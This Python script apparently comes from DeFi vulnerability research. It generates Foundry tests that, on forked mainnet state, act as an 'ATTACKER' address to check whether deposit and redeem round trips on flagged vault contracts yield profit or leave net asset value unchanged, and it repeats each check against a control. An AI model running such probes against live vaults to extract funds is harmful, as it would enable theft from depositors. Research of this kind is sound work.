#!/usr/bin/env python3
from __future__ import annotations
import json, re
from pathlib import Path

roots = sorted([p for p in Path("r13_persisted_results").glob("*") if p.is_dir()], key=lambda p: int(p.name) if p.name.isdigit() else 0)
Path("r14_generation").mkdir(exist_ok=True)
if not roots:
    candidates = []
    scope = []
    source_run = None
else:
    root = roots[-1]
    source_run = root.name
    log_path = root / "r13_results" / "FULL_SCOPE_ROUNDTRIP.log"
    scope_path = root / "r13_generation" / "SCOPE.json"
    log = log_path.read_text(errors="replace") if log_path.exists() else ""
    scope = json.loads(scope_path.read_text()) if scope_path.exists() else []
    positive = {x.lower() for x in re.findall(r"R13_CANDIDATE_POSITIVE_PROFIT\s+(0x[a-fA-F0-9]{40})", log)}
    zero_nav = {x.lower() for x in re.findall(r"R13_CANDIDATE_ZERO_NAV_DELTA\s+(0x[a-fA-F0-9]{40})", log)}
    smap = {x["vault"].lower(): x for x in scope}
    candidates = []
    for address in sorted(positive | zero_nav):
        row = dict(smap.get(address, {"vault": address, "network": "unknown", "label": address, "connector": "unknown"}))
        row["positive_profit_marker"] = address in positive
        row["zero_nav_marker"] = address in zero_nav
        candidates.append(row)

Path("r14_generation/CANDIDATES.json").write_text(json.dumps({"source_run": source_run, "candidates": candidates}, indent=2))
RPC = {
    "ethereum": "https://ethereum-rpc.publicnode.com",
    "bnb": "https://bsc-rpc.publicnode.com",
    "polygon": "https://polygon-bor-rpc.publicnode.com",
    "base": "https://base-rpc.publicnode.com",
    "arbitrum": "https://arbitrum-one-rpc.publicnode.com",
    "optimism": "https://optimism-rpc.publicnode.com",
    "avalanche": "https://avalanche-c-chain-rpc.publicnode.com",
    "linea": "https://linea-rpc.publicnode.com",
    "scroll": "https://scroll-rpc.publicnode.com",
    "gnosis": "https://gnosis-rpc.publicnode.com",
}

header = r'''// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;
import {Test, console2} from "forge-std/Test.sol";

interface IR14Vault {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function depositFee() external view returns (uint256);
    function connectorRegistry() external view returns (address);
    function connectorName() external view returns (bytes32);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
}

contract KilnR14IsolatedRepro is Test {
    address internal constant ATTACKER = address(0xA7711400);
'''
funcs = []
if not candidates:
    funcs.append('    function test_noR13Candidates() external pure { }\n')
else:
    for i, c in enumerate(candidates):
        rpc = RPC.get(c.get("network"), "")
        flagp = "true" if c.get("positive_profit_marker") else "false"
        flagz = "true" if c.get("zero_nav_marker") else "false"
        funcs.append(f'''    function test_candidate_{i}() external {{
        _isolate("{rpc}", {c["vault"]}, {flagp}, {flagz});
    }}
''')

footer = r'''
    function _isolate(string memory rpc, address vaultAddr, bool expectPositive, bool expectZeroNav) internal {
        require(bytes(rpc).length != 0, "unsupported network");
        vm.createSelectFork(rpc);
        uint256 fixedBlock = block.number;
        IR14Vault vault = IR14Vault(vaultAddr);
        address asset = vault.asset();
        uint8 decimals = _decimals(asset);
        uint256 unit = 10 ** decimals;
        uint256 total = vault.totalAssets();
        address market = _resolveMarket(vaultAddr, asset);
        uint256[] memory amounts = new uint256[](8);
        amounts[0] = unit;
        amounts[1] = _max(unit, total / 1_000_000);
        amounts[2] = _max(unit, total / 100_000);
        amounts[3] = _max(unit, total / 10_000);
        amounts[4] = _max(unit, total / 1_000);
        amounts[5] = _max(unit, total / 100);
        amounts[6] = _max(unit, total);
        amounts[7] = _boundedMul(_max(unit, total), 10);

        int256 bestProfit = type(int256).min;
        uint256 bestProfitAmount;
        uint256 lowestNavPpm = type(uint256).max;
        uint256 lowestNavAmount;
        for (uint256 i; i < amounts.length; ++i) {
            (bool ok, int256 profit, uint256 navDelta, uint256 expectedNet, uint256 remaining) =
                _roundTrip(rpc, fixedBlock, vaultAddr, amounts[i], address(0));
            if (!ok || remaining != 0) continue;
            if (profit > bestProfit) {
                bestProfit = profit;
                bestProfitAmount = amounts[i];
            }
            uint256 ppm = expectedNet == 0 ? type(uint256).max : navDelta * 1_000_000 / expectedNet;
            if (ppm < lowestNavPpm) {
                lowestNavPpm = ppm;
                lowestNavAmount = amounts[i];
            }
        }
        console2.log("R14_VAULT", vaultAddr);
        console2.log("R14_FIXED_BLOCK", fixedBlock);
        console2.log("R14_MARKET", market);
        console2.log("R14_BEST_PROFIT_AMOUNT", bestProfitAmount);
        console2.log("R14_BEST_PROFIT_SIGNED");
        console2.logInt(bestProfit);
        console2.log("R14_LOWEST_NAV_PPM", lowestNavPpm);
        console2.log("R14_LOWEST_NAV_AMOUNT", lowestNavAmount);

        uint256 positiveAttackPasses;
        uint256 positiveControlPasses;
        uint256 zeroNavPasses;
        for (uint256 r; r < 5; ++r) {
            if (bestProfitAmount != 0) {
                (bool aOk, int256 aProfit,,, uint256 aRemaining) =
                    _roundTrip(rpc, fixedBlock, vaultAddr, bestProfitAmount, address(0));
                if (aOk && aRemaining == 0 && aProfit > int256(unit)) ++positiveAttackPasses;
                if (market != address(0)) {
                    (bool cOk, int256 cProfit,,, uint256 cRemaining) =
                        _roundTrip(rpc, fixedBlock, vaultAddr, bestProfitAmount, market);
                    if (cOk && cRemaining == 0 && cProfit <= 0) ++positiveControlPasses;
                }
            }
            if (lowestNavAmount != 0) {
                (bool nOk,, uint256 nDelta, uint256 nExpected, uint256 nRemaining) =
                    _roundTrip(rpc, fixedBlock, vaultAddr, lowestNavAmount, address(0));
                uint256 tolerance = _max(uint256(100), nExpected / 1_000_000);
                if (nOk && nRemaining == 0 && nExpected > tolerance && nDelta + tolerance < nExpected / 100) {
                    ++zeroNavPasses;
                }
            }
        }
        console2.log("R14_POSITIVE_ATTACK_5OF5", positiveAttackPasses);
        console2.log("R14_POSITIVE_ACCRUED_CONTROL_5OF5", positiveControlPasses);
        console2.log("R14_ZERO_NAV_5OF5", zeroNavPasses);
        bool positiveConfirmed = expectPositive && positiveAttackPasses == 5 && positiveControlPasses == 5;
        bool zeroNavConfirmed = expectZeroNav && zeroNavPasses == 5;
        if (positiveConfirmed) console2.log("R14_CONFIRMED_POSITIVE_DIFFERENTIAL", vaultAddr);
        if (zeroNavConfirmed) console2.log("R14_CONFIRMED_ZERO_NAV_CONTEXT_FAILURE", vaultAddr);
        assertFalse(positiveConfirmed || zeroNavConfirmed, "R14 isolated candidate confirmed");
    }

    function _roundTrip(string memory rpc, uint256 fixedBlock, address vaultAddr, uint256 amount, address accrueMarket)
        internal
        returns (bool ok, int256 profit, uint256 navDelta, uint256 expectedNet, uint256 remainingShares)
    {
        vm.createSelectFork(rpc, fixedBlock);
        IR14Vault vault = IR14Vault(vaultAddr);
        address asset = vault.asset();
        uint8 decimals = _decimals(asset);
        uint256 beforeTA = vault.totalAssets();
        uint256 feeRate = vault.depositFee();
        expectedNet = amount - amount * feeRate / (100 * (10 ** decimals));
        if (accrueMarket != address(0)) {
            (bool accrued,) = accrueMarket.call(abi.encodeWithSignature("exchangeRateCurrent()"));
            if (!accrued) return (false, 0, 0, expectedNet, 0);
        }
        try this.exposedDeal(asset, ATTACKER, amount) { } catch { return (false, 0, 0, expectedNet, 0); }
        uint256 beforeBal = _balanceOf(asset, ATTACKER);
        vm.startPrank(ATTACKER);
        if (!_approve(asset, vaultAddr, type(uint256).max)) {
            vm.stopPrank();
            return (false, 0, 0, expectedNet, 0);
        }
        uint256 shares;
        try vault.deposit(amount, ATTACKER) returns (uint256 s) { shares = s; }
        catch {
            vm.stopPrank();
            return (false, 0, 0, expectedNet, 0);
        }
        uint256 afterTA;
        try vault.totalAssets() returns (uint256 a) { afterTA = a; }
        catch {
            vm.stopPrank();
            return (false, 0, 0, expectedNet, shares);
        }
        navDelta = afterTA > beforeTA ? afterTA - beforeTA : 0;
        try vault.redeem(shares, ATTACKER, ATTACKER) returns (uint256) { }
        catch {
            vm.stopPrank();
            remainingShares = _balanceOf(vaultAddr, ATTACKER);
            return (false, 0, navDelta, expectedNet, remainingShares);
        }
        vm.stopPrank();
        uint256 afterBal = _balanceOf(asset, ATTACKER);
        remainingShares = _balanceOf(vaultAddr, ATTACKER);
        ok = true;
        profit = int256(afterBal) - int256(beforeBal);
    }

    function _resolveMarket(address vaultAddr, address asset) internal view returns (address market) {
        IR14Vault vault = IR14Vault(vaultAddr);
        address registry = vault.connectorRegistry();
        bytes32 name = vault.connectorName();
        address connector = _staticAddress(registry, abi.encodeWithSignature("connectorAddress(bytes32)", name));
        if (connector == address(0)) connector = _staticAddress(registry, abi.encodeWithSignature("get(bytes32)", name));
        if (connector == address(0)) return address(0);
        market = _firstAddress(connector, abi.encodeWithSignature("vToken()"), abi.encodeWithSignature("vtoken()"), abi.encodeWithSignature("venus()"), abi.encodeWithSignature("pool()"));
        if (market != address(0)) return market;
        address mr = _firstAddress(connector, abi.encodeWithSignature("venusMarketRegistry()"), abi.encodeWithSignature("marketRegistry()"), abi.encodeWithSignature("compoundMarketRegistry()"), bytes(""));
        if (mr == address(0)) return address(0);
        market = _staticAddress(mr, abi.encodeWithSignature("getMarket(address)", asset));
        if (market == address(0)) market = _staticAddress(mr, abi.encodeWithSignature("getVToken(address)", asset));
        if (market == address(0)) market = _staticAddress(mr, abi.encodeWithSignature("market(address)", asset));
    }

    function _firstAddress(address target, bytes memory a, bytes memory b, bytes memory c, bytes memory d) internal view returns (address out) {
        if (a.length != 0) out = _staticAddress(target, a);
        if (out == address(0) && b.length != 0) out = _staticAddress(target, b);
        if (out == address(0) && c.length != 0) out = _staticAddress(target, c);
        if (out == address(0) && d.length != 0) out = _staticAddress(target, d);
    }

    function _staticAddress(address target, bytes memory data) internal view returns (address out) {
        (bool ok, bytes memory ret) = target.staticcall(data);
        if (ok && ret.length >= 32) out = abi.decode(ret, (address));
    }

    function exposedDeal(address token, address to, uint256 amount) external {
        require(msg.sender == address(this), "self only");
        deal(token, to, amount, true);
    }

    function _approve(address token, address spender, uint256 value) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(bytes4(0x095ea7b3), spender, value));
        return ok && (ret.length == 0 || (ret.length >= 32 && abi.decode(ret, (bool))));
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(bytes4(0x70a08231), account));
        require(ok && ret.length >= 32, "balanceOf failed");
        value = abi.decode(ret, (uint256));
    }

    function _decimals(address token) internal view returns (uint8 value) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(bytes4(0x313ce567)));
        require(ok && ret.length >= 32, "decimals failed");
        value = abi.decode(ret, (uint8));
    }

    function _max(uint256 a, uint256 b) internal pure returns (uint256) { return a > b ? a : b; }
    function _boundedMul(uint256 a, uint256 b) internal pure returns (uint256) { return a > type(uint256).max / b ? type(uint256).max : a * b; }
}
'''
Path("test/KilnR14IsolatedRepro.t.sol").write_text(header + "\n".join(funcs) + footer)
print(json.dumps({"source_run": source_run, "candidate_count": len(candidates), "candidates": candidates}, indent=2))
